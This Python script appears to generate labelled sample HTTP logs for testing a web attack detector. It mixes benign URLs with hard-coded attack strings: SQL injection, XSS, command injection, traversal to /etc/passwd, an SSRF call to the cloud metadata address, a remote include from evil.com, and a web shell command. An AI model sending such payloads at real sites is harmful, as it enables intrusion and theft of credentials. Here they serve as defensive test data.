"""
Generate sample HTTP log files for testing
"""
import csv
import json
import random
from pathlib import Path
from datetime import datetime, timedelta
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SampleLogGenerator:
    """Generate sample HTTP logs for testing"""
    
    def __init__(self, output_dir: Path = None):
        if output_dir is None:
            output_dir = Path(__file__).parent.parent / 'sample_data'
        
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
    
    def generate_samples(self, count: int = 100):
        """Generate sample HTTP requests"""
        samples = []
        
        attack_urls = [
            ("http://example.com/login?user=' OR '1'='1", "SQLi"),
            ("http://example.com/search?q=<script>alert(1)</script>", "XSS"),
            ("http://example.com/exec?cmd=ls -la", "CMD Injection"),
            ("http://example.com/file?path=../../../../etc/passwd", "Directory Traversal"),
            ("http://example.com/proxy?url=http://169.254.169.254/latest/meta-data", "SSRF"),
            ("http://example.com/include?page=http://evil.com/shell.txt", "LFI/RFI"),
            ("http://example.com/uploads/shell.php?cmd=whoami", "Web Shell"),
        ]
        
        benign_urls = [
            "http://example.com/",
            "http://example.com/products",
            "http://example.com/about",
            "http://example.com/contact",
            "http://example.com/search?q=laptop",
            "http://example.com/user/profile",
            "http://example.com/api/data",
        ]
        
        for i in range(count):
            # 30% attacks, 70% benign
            if random.random() < 0.3:
                url, attack_type = random.choice(attack_urls)
            else:
                url = random.choice(benign_urls)
                attack_type = "Benign"
            
            sample = {
                'timestamp': (datetime.now() - timedelta(minutes=random.randint(0, 1000))).isoformat(),
                'src_ip': f"192.168.1.{random.randint(1, 254)}",
                'dst_ip': '10.0.0.100',
                'method': random.choice(['GET', 'POST', 'PUT', 'DELETE']),
                'url': url,
                'host': 'example.com',
                'user_agent': 'Mozilla/5.0',
                'response_code': random.choice([200, 200, 200, 404, 500]),
                'actual_attack': attack_type
            }
            samples.append(sample)
        
        return samples
    
    def save_csv(self, samples, filename='sample_http_log.csv'):
        """Save samples to CSV"""
        filepath = self.output_dir / filename
        
        with open(filepath, 'w', newline='', encoding='utf-8') as f:
            if not samples:
                return filepath
            
            fieldnames = samples[0].keys()
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(samples)
        
        logger.info(f"Saved {len(samples)} samples to {filepath}")
        return filepath
    
    def save_json(self, samples, filename='sample_http_log.json'):
        """Save samples to JSON"""
        filepath = self.output_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(samples, f, indent=2)
        
        logger.info(f"Saved {len(samples)} samples to {filepath}")
        return filepath

def main():
    """Generate sample files"""
    generator = SampleLogGenerator()
    
    # Generate 100 sample requests
    samples = generator.generate_samples(100)
    
    # Save in both formats
    generator.save_csv(samples)
    generator.save_json(samples)
    
    logger.info("\nSample files generated successfully!")
    logger.info("You can now upload these files to test the system:")
    logger.info(f"  - {generator.output_dir / 'sample_http_log.csv'}")
    logger.info(f"  - {generator.output_dir / 'sample_http_log.json'}")

if __name__ == '__main__':
    main()
